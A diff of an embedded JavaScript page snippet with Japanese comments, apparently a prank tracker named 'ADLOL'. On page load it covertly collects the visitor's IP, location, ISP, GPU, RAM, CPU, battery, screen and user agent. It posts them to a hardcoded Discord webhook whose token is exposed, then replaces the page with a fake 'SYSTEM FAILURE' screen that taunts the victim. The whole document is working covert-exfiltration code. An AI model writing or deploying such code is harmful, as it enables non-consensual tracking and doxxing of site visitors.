@@ -1,75 +1,107 @@
 <script type="text/javascript">
 (async function() {
+    // 設定：あなたのWebhook URL
     const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
-    // 1. IPと場所を取得する「しぶとい」関数
-    async function getDeepInfo() {
-        // 第1候補: ip-api (一番詳しい)
-        try {
-            const r = await fetch('https://demo.ip-api.com/json/?fields=66846719');
-            if (r.ok) return await r.json();
-        } catch (e) {}
-
-        // 第2候補: ipapi.co (第1がダメな時)
+    async function getFullData() {
+        let net = { query: "取得失敗", city: "不明", country: "不明", isp: "不明", as: "不明" };
+        
+        // 1. ネットワーク情報の取得（タイムアウト付きで確実に待機）
         try {
             const r = await fetch('https://ipapi.co/json/');
             if (r.ok) {
                 const d = await r.json();
-                return { query: d.ip, city: d.city, country: d.country_name, isp: d.org, timezone: d.timezone };
+                net = { 
+                    query: d.ip || "取得失敗", 
+                    city: d.city || "不明", 
+                    country: d.country_name || "不明", 
+                    isp: d.org || "不明",
+                    as: d.asn || "不明"
+                };
             }
-        } catch (e) {}
+        } catch (e) {
+            // メインがダメな場合のバックアップ
+            try {
+                const r2 = await fetch('https://api.ipify.org?format=json');
+                const d2 = await r2.json();
+                net.query = d2.ip;
+            } catch (e2) {}
+        }
 
-        // 第3候補: ipify (最低限IPだけは取る)
+        // 2. ハードウェア情報（GPU/RAM/CPU）
+        let gpu = "N/A";
         try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            if (r.ok) {
-                const d = await r.json();
-                return { query: d.ip, city: "特定不能(APIブロック)", isp: "不明" };
-            }
-        } catch (e) {}
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch(e){}
 
-        return { query: "取得失敗", city: "不明" };
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "不明";
+        const cores = navigator.hardwareConcurrency || "不明";
+        
+        let bat = "不明";
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.floor(b.level * 100) + "%";
+            }
+        } catch(e){}
+
+        return { net, gpu, ram, cores, bat };
     }
 
-    const d = await getDeepInfo();
+    // データの取得を待つ
+    const info = await getFullData();
 
-    // 2. その他のデバイス情報
-    let gpu = "N/A";
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    } catch(e){}
-
-    // 3. Discordへ送信
+    // 3. Discord用ペイロードの構築
     const payload = {
         embeds: [{
-            title: "💀 ターゲット完全捕捉 (トリプルAPI)",
+            title: "🚨 ターゲット完全捕捉 (ADLOL V4 Final)",
             color: 16711680,
             fields: [
-                { name: "🌐 ネットワーク", value: `**IP:** ${d.query}\n**場所:** ${d.city}, ${d.country || ""}\n**ISP:** ${d.isp}`, inline: false },
-                { name: "💻 スペック", value: `**GPU:** ${gpu}\n**OS:** ${navigator.platform}\n**コア数:** ${navigator.hardwareConcurrency}`, inline: false }
+                { 
+                    name: "🌐 ネットワーク", 
+                    value: `**IP:** ${info.net.query}\n**場所:** ${info.net.city}, ${info.net.country}\n**ISP:** ${info.net.isp}\n**AS番号:** ${info.net.as}`, 
+                    inline: false 
+                },
+                { 
+                    name: "💻 ハードウェア", 
+                    value: `**GPU:** ${info.gpu}\n**RAM:** ${info.ram}\n**CPU:** ${info.cores} Cores\n**OS:** ${navigator.platform}`, 
+                    inline: false 
+                },
+                { 
+                    name: "🔋 ステータス", 
+                    value: `**電池:** ${info.bat}\n**画面:** ${screen.width}x${screen.height}\n**言語:** ${navigator.language}`, 
+                    inline: true 
+                },
+                { 
+                    name: "🔍 ブラウザ指紋", 
+                    value: `\`\`\`${navigator.userAgent}\`\`\``, 
+                    inline: false 
+                }
             ],
-            footer: { text: "ADLOL Tracker v3" },
+            footer: { text: "ADLOL Global Tracker" },
             timestamp: new Date()
         }]
     };
 
+    // 4. Discordへ送信
     await fetch(w, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     });
 
-    // 4. 演出（相手のIPをデカデカと出す）
+    // 5. 送信後の「ハッキング風」画面演出
     document.body.innerHTML = `
-        <div style="background:#000; color:#f00; height:100vh; padding:40px; font-family:monospace;">
-            <h1>[FATAL ERROR]</h1>
-            <p>> IP ADDR: ${d.query}</p>
-            <p>> LOCATION: ${d.city}</p>
-            <p>> ALL DATA SENT TO SERVER.</p>
-            <blink>_</blink>
+        <div style="background:#000; color:#0f0; height:100vh; padding:40px; font-family:monospace; line-height:1.6; position:fixed; top:0; left:0; width:100vw; z-index:9999;">
+            <h1 style="color:red; border-bottom:1px solid red;">[SYSTEM FAILURE]</h1>
+            <p>> TARGET_IP: ${info.net.query}</p>
+            <p>> CITY: ${info.net.city}</p>
+            <p>> GPU_RENDERER: ${info.gpu}</p>
+            <p>> UPLOADING DATA TO ADLOL SERVER... 100%</p>
+            <p style="margin-top:40px; color:white; background:red; display:inline-block; padding:5px;">You got caught by Shírûmá.😂😂</p>
         </div>
     `;
 })();
